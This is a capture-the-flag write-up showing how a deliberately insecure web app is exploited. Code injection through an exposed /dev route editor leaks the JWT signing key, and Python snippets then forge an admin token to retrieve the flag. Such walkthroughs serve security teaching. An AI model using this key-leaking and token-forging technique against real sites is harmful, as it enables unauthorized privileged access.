# The Problem

> Our team enlisted the intern to make their new website! Their code passes SonarQ's tests, so, it must be secure...
> right?

# Enumeration

First, we enumerate directories on the ip.

![Enumeration result](./report/enumeration.png)

In the output, we can see notably a `/login` directory and a `/dev` directory.

We follow the `/login` directory to the login page.

![Login page](report/login.png)

We try to find forgotten credentials in the page, common user names and passwords, SQL injection, to no avail.

Then, we check out `/dev`, which seems to have json with the routes in an editable text area. 
Must be some remnant from development.

![/dev page](report/dev.png)

Also noteworthy, there seems to be some python code, so, there is a code injection point!

Trying to find out the environment, we pass `dir()` to the `/exec`'s `method` field.
This yields the following: `['_ep', 'endpoint', 'self']`

To find out more, let's see what properties does `self` have with `dir(self)`: `['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'load_controllers', 'load_routes', 'routes', 'tk_factory']`

We see a `tk_factory`, which must be the provider of tokens. Let's see what are it's properties with `dir(self.tk_factory)`: `['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'generate_token', 'key', 'token_verify']`

Here we seem to be able to manipulate and see all the logic!
Let's get the key that generates the tokens with `self.tk_factory.key`: `708a313dbad5ed23442c63a47aef74444cf8cf1f55526ddb6d240008b7021847338fe56c6b0a259aae297367b98612eb84d7`.

Note that this value can change from session to session.

Now we need a token. For that, we go to the `/register` page in order to register an account.

![img.png](report/register.png)

And we get the token in the url: `https://127.0.0.1:5000/flagpage?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImEiLCJhZG1pbiI6ZmFsc2V9.zXVLUvyoTUX7zjdz3Zf9-Nij4CnKKa6s04bItkJQMjI`

In order to decrypt it, we can run the following code:

```py
import jwt

secret_key = "<key>"
token = "<token>"

decoded_token = jwt.decode(token, secret_key, algorithms=["HS256"])
print(decoded_token)
```

which returns the following json:

```json
{
  "username": "a", 
  "admin": false
}
```

Now, we can try setting `admin` to `true`. To do this, we run the following code:

```py
encoded_token = jwt.encode(
    {
        'username': 'a',
        'admin': True
    },
    key=secret_key,
    algorithm='HS256'
)

print(encoded_token)
```

which returns `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImEiLCJhZG1pbiI6dHJ1ZX0.DLqzMzKiXw7XO0pysKdi73ktVulsWZByivQlUuWDNEo`

By replacing this for the token in the url we get the flag!

![img.png](report/flag.png)